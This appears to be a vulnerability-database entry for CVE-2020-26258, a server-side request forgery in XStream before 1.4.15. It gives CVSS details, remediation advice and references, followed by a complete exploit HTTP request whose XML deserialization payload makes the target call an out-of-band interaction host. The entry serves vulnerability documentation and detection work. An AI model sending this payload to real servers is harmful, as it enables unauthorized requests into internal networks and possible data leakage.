---
layout: "post"
cve_id: "CVE-2020-26258"
title: "XStream <1.4.15 - Server-Side Request Forgery"
pcap: true
pcap_path: "/pcaps/2020/CVE-2020-26258.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2020/CVE-2020-26258.yaml"
author: "pwnhxl"
severity: "high"
impact: "An attacker can exploit this vulnerability to make requests to internal resources, potentially leading to data leakage or further attacks.
"
remediation: "Install at least 1.4.15 if you rely on XStream's default blacklist of the Security Framework, and at least Java 15 or higher."
reference:
  - "https://x-stream.github.io/CVE-2020-26258.html"
  - "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-26258"
  - "https://github.com/x-stream/xstream/security/advisories/GHSA-4cch-wxpw-8p28"
  - "https://nvd.nist.gov/vuln/detail/CVE-2020-26258"
  - "https://lists.apache.org/thread.html/r97993e3d78e1f5389b7b172ba9f308440830ce5f051ee62714a0aa34@%3Ccommits.struts.apache.org%3E"
classification: "{'cvss-metrics': 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N', 'cvss-score': 7.7, 'cve-id': 'CVE-2020-26258', 'cwe-id': 'CWE-918', 'epss-score': 0.9368, 'epss-percentile': 0.99833, 'cpe': 'cpe:2.3:a:xstream_project:xstream:*:*:*:*:*:*:*:*'}"
metadata: "{'max-request': 1, 'vendor': 'xstream_project', 'product': 'xstream'}"
tags:
  - "cve"
  - "cve2020"
  - "xstream"
  - "ssrf"
  - "oast"
  - "xstream_project"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## ðŸ” Vulnerability Description
XStream before 1.4.15 is susceptible to server-side request forgery. An attacker can request data from internal resources that are not publicly available by manipulating the processed input stream, thereby making it possible to obtain sensitive information, modify data, and/or execute unauthorized administrative operations.


## ðŸŒ HTTP Request
```nohighlight
POST / HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Connection: close
Content-Length: 566
Content-Type: application/xml
Accept-Encoding: gzip

<map>
  <entry>
    <jdk.nashorn.internal.objects.NativeString>
      <flags>0</flags>
      <value class='com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'>
        <dataHandler>
          <dataSource class='javax.activation.URLDataSource'>
            <url>http://d5iv9aple0o36375tnjg336aqzuqnouwu.oast.pro/internal/:</url>
          </dataSource>
          <transferFlavors/>
        </dataHandler>
        <dataLen>0</dataLen>
      </value>
    </jdk.nashorn.internal.objects.NativeString>
    <string>test</string>
  </entry>
</map>
```

